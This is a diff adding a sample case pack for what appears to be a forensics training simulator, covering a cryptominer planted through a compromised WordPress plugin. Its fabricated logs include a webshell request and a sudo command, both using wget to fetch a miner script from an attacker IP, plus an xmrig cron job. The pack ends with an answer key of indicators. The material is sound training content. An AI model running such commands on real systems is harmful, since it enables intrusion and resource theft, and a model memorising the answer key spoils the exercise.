@@ -1,0 +1,45 @@
+{
+  "pack_info": {
+    "name": "Sample Case Pack",
+    "author": "DFIR Simulator Team",
+    "version": "1.0",
+    "description": "A sample case pack demonstrating the modding format. Create your own!"
+  },
+  "cases": [
+    {
+      "title": "Cryptominer on Web Server",
+      "description": "A university web server is running unusually hot. CPU usage is at 100% but no one knows why. The sysadmin suspects a cryptominer was installed after a WordPress plugin was compromised.",
+      "severity": "MEDIUM",
+      "deadline_hours": 24,
+      "reputation_reward": 6.0,
+      "attack_techniques": ["T1190", "T1059.004", "T1496"],
+      "client": {
+        "name": "Professor Chen",
+        "title": "IT Director",
+        "organization": "State University",
+        "personality": "competent_ciso"
+      },
+      "evidence": [
+        {
+          "name": "auth.log",
+          "type": "linux_syslog",
+          "path": "/evidence/logs/auth.log",
+          "content": "Mar 10 02:15:33 web01 sshd[8821]: Accepted password for www-data from 45.33.22.11 port 44221\nMar 10 02:15:45 web01 sudo: www-data : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/wget http://45.33.22.11/miner.sh\nMar 10 02:16:01 web01 CRON[8850]: (root) CMD (/tmp/.hidden/xmrig --donate-level 0 -o pool.minexmr.com:4443)\nMar 10 08:00:00 web01 sshd[9100]: Accepted publickey for admin from 10.0.0.5 port 22\nMar 10 08:05:12 web01 sudo: admin : TTY=pts/1 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/top"
+        },
+        {
+          "name": "access.log",
+          "type": "apache_log",
+          "path": "/evidence/logs/access.log",
+          "content": "45.33.22.11 - - [10/Mar/2024:01:30:00 +0000] \"GET /wp-admin/plugin-install.php HTTP/1.1\" 200 4521\n45.33.22.11 - - [10/Mar/2024:01:31:15 +0000] \"POST /wp-admin/plugin-install.php HTTP/1.1\" 200 142\n45.33.22.11 - - [10/Mar/2024:02:15:00 +0000] \"GET /wp-content/plugins/backdoor/shell.php?cmd=id HTTP/1.1\" 200 44\n45.33.22.11 - - [10/Mar/2024:02:15:20 +0000] \"GET /wp-content/plugins/backdoor/shell.php?cmd=wget+http://45.33.22.11/miner.sh+-O+/tmp/m.sh HTTP/1.1\" 200 12"
+        }
+      ],
+      "correct_iocs": [
+        {"type": "ip", "value": "45.33.22.11", "context": "Attacker IP - webshell + miner delivery"},
+        {"type": "domain", "value": "pool.minexmr.com", "context": "Mining pool"},
+        {"type": "filepath", "value": "/tmp/.hidden/xmrig", "context": "Cryptominer binary"},
+        {"type": "filepath", "value": "/wp-content/plugins/backdoor/shell.php", "context": "PHP webshell"},
+        {"type": "url", "value": "http://45.33.22.11/miner.sh", "context": "Miner download script"}
+      ]
+    }
+  ]
+}
